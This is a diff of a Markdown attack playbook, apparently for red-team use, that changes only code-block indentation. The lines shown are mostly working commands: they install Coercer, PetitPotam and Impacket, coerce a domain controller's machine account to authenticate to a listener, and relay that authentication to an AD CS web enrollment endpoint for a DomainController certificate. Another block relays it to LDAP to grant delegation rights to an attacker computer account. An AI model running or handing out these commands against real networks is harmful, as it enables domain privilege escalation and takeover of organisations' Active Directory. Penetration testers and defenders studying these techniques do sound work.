@@ -45,15 +45,15 @@ Many Windows RPC interfaces expose methods that take a UNC path and cause the re
 - A relay listener (Certipy `relay` or Impacket `ntlmrelayx`) on a reachable host
 - Network reachability to the target's RPC endpoints (135 + dynamic, 445)
 - Linux attack host with Python 3.8+; install the tools:
-  ```bash
-  # Coercer
-  pipx install coercer        # or: sudo python3 -m pip install coercer
-  coercer --help
-  # PetitPotam (source)
-  git clone https://github.com/topotam/PetitPotam
-  # Impacket (provides ntlmrelayx, dFSCoerce etc.)
-  pipx install impacket
-  ```
+ ```bash
+ # Coercer
+ pipx install coercer # or: sudo python3 -m pip install coercer
+ coercer --help
+ # PetitPotam (source)
+ git clone https://github.com/topotam/PetitPotam
+ # Impacket (provides ntlmrelayx, dFSCoerce etc.)
+ pipx install impacket
+ ```
 
 ## Objectives
 
@@ -78,7 +78,7 @@ Use Coercer's scan mode to enumerate which RPC methods on the target can be leve
 
 ```bash
 coercer scan -u 'attacker' -p 'Passw0rd!' -d corp.local \
-    -t 10.0.0.10 -l 10.0.0.50
+ -t 10.0.0.10 -l 10.0.0.50
 ```
 `-t` is the target (e.g., the DC), `-l` is the listener IP that should receive the coerced authentication.
 
@@ -91,7 +91,7 @@ certipy relay -target 'http://CA.CORP.LOCAL' -template 'DomainController'
 
 # Alternative: Impacket ntlmrelayx
 impacket-ntlmrelayx -t http://CA.CORP.LOCAL/certsrv/certfnsh.asp \
-    -smb2support --adcs --template DomainController
+ -smb2support --adcs --template DomainController
 ```
 
 ### Step 3: Coerce authentication with Coercer
@@ -99,12 +99,12 @@ Trigger the target machine account to authenticate to the relay/listener. `--alw
 
 ```bash
 coercer coerce -u 'attacker' -p 'Passw0rd!' -d corp.local \
-    -t 10.0.0.10 -l 10.0.0.50 --always-continue
+ -t 10.0.0.10 -l 10.0.0.50 --always-continue
 ```
 To use a single specific method (quieter), filter by method name:
 ```bash
 coercer coerce -u 'attacker' -p 'Passw0rd!' -d corp.local \
-    -t 10.0.0.10 -l 10.0.0.50 --filter-method-name PetitPotam
+ -t 10.0.0.10 -l 10.0.0.50 --filter-method-name PetitPotam
 ```
 
 ### Step 4: Coerce with PetitPotam directly (MS-EFSR)
@@ -132,7 +132,7 @@ If ESC8 is unavailable, relay coerced auth to LDAP to configure Resource-Based C
 ```bash
 # Relay to LDAP and delegate to attacker-controlled computer account
 impacket-ntlmrelayx -t ldap://dc.corp.local --delegate-access \
-    --escalate-user 'attacker$' -smb2support
+ --escalate-user 'attacker$' -smb2support
 # Then coerce as in Step 3
 ```
 
@@ -141,7 +141,7 @@ Fuzz mode varies UNC paths to find coercion paths bypassing partial patches.
 
 ```bash
 coercer fuzz -u 'attacker' -p 'Passw0rd!' -d corp.local \
-    -t 10.0.0.10 -l 10.0.0.50
+ -t 10.0.0.10 -l 10.0.0.50
 ```
 
 ## Tools and Resources
